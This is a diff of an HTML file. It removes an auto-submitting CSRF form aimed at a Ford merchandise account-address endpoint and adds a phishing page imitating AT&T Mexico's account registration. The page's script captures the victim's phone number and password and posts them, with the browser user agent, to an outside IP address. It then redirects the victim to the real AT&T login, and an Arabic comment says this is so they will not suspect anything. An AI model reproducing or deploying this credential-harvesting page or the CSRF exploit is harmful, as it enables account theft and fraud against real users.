@@ -1,28 +1,168 @@
-<html>
-  <body>
-    <form id="csrf-form" action="https://merchandise.ford.com/account/addresses" method="POST">
-      <input type="hidden" name="form_type" value="customer_address">
-      <input type="hidden" name="utf8" value="✓">
-      
-      <input type="hidden" name="address[default]" value="1">
-      <input type="hidden" name="address[first_name]" value="look">
-      <input type="hidden" name="address[last_name]" value="up">
-      <input type="hidden" name="address[company]" value="ll">
-      <input type="hidden" name="address[address1]" value="876 mnhgtr">
-      <input type="hidden" name="address[city]" value="makkjj">
-      <input type="hidden" name="address[province]" value="Alabama">
-      <input type="hidden" name="address[zip]" value="35004">
-      <input type="hidden" name="address[country]" value="United States">
-      <input type="hidden" name="address[phone]" value="1234567890">
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AT&T México - Registro</title>
+    <style>
+        /* --- CSS Style --- */
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-      <input type="submit" value="Submit Request">
-    </form>
+        .container {
+            background: #ffffff;
+            padding: 35px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .logo img {
+            width: 140px;
+            margin-bottom: 25px;
+        }
+
+        h2 {
+            color: #00A8E0;
+            font-size: 24px;
+            font-weight: 300;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        input:focus {
+            border-color: #00A8E0;
+            outline: none;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #00A8E0;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }
+
+        .btn-submit:hover {
+            background-color: #0076a8;
+        }
+
+        .footer-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer-text a {
+            color: #00A8E0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <!-- شعار AT&T المكسيك -->
+            <img src="https://www.att.com.mx/content/dam/att/logos/att-logo.png" alt="AT&T">
+        </div>
+        
+        <h2>Crea tu cuenta</h2>
+
+        <form id="attForm">
+            <div class="input-group">
+                <label>Número AT&T (10 dígitos)</label>
+                <input type="text" id="phone" name="phone" placeholder="Ej. 5512345678" required>
+            </div>
+
+            <div class="input-group">
+                <label>Contraseña</label>
+                <input type="password" id="password" name="password" placeholder="Tu contraseña" required>
+            </div>
+
+            <button type="submit" class="btn-submit">Siguiente</button>
+        </form>
+
+        <div class="footer-text">
+            <p>Al continuar, aceptas nuestros <a href="#">Términos y Condiciones</a></p>
+        </div>
+    </div>
 
     <script>
-      // التأكد من تحميل الصفحة ثم إرسال النموذج تلقائياً
-      window.onload = function() {
-        document.getElementById('csrf-form').submit();
-      };
+        // --- JavaScript Logic ---
+        document.getElementById('attForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // منع الصفحة من التحديث
+
+            // سحب البيانات من الحقول
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+
+            // البيانات التي سيتم إرسالها لسيرفرك
+            const data = {
+                target_phone: phone,
+                target_pass: password,
+                agent: navigator.userAgent,
+                captured_at: new Date().toLocaleString()
+            };
+
+            // ---- مكان وضع رابط سيرفرك ----
+            // ملاحظة: يمكنك استخدام Webhook.site للتجربة السريعة
+            const YOUR_SERVER_URL = 'https://http://167.172.78.253/collect.php'; 
+
+            fetch(YOUR_SERVER_URL, {
+                method: 'POST',
+                mode: 'no-cors', // لتجنب مشاكل الـ CORS في بعض السيرفرات البسيطة
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                // توجيه الضحية (في التحدي) للموقع الأصلي بعد "نجاح" العملية
+                window.location.href = "https://www.att.com.mx/mizonaatt/login";
+            })
+            .catch(err => {
+                console.log("Error de conexión");
+                // حتى لو فشل الاتصال، نوجهه عشان ما يشك
+                window.location.href = "https://www.att.com.mx/mizonaatt/login";
+            });
+        });
     </script>
-  </body>
+
+</body>
 </html>
